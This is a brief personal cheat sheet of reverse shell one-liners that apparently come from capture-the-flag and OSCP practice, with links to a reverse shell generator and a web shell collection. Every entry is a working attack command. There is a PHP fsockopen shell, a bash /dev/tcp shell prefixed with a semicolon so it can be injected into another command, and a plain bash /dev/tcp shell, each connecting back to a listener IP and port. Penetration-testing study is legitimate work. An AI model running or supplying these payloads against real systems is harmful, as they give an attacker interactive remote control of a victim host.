## Reverse shells that actually worked during my travels

--> Php

```
php -r '$sock=fsockopen("10.10.14.31",4321);exec("/bin/sh -i <&3 >&3 2>&3");'
```

--> Bash

``` (from Script Kiddie, htb)
;/bin/bash -c 'bash -i >& /dev/tcp/10.10.16.176/4444 0>&1' #
```


--> Bash2

```(From OSCP Study, this takes no " or ')
bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
```


--> Reverse Shell Generator:

https://github.com/mthbernardes/rsg

--> Reverse shells:

https://github.com/jbarcia/Web-Shells/tree/master/laudanum

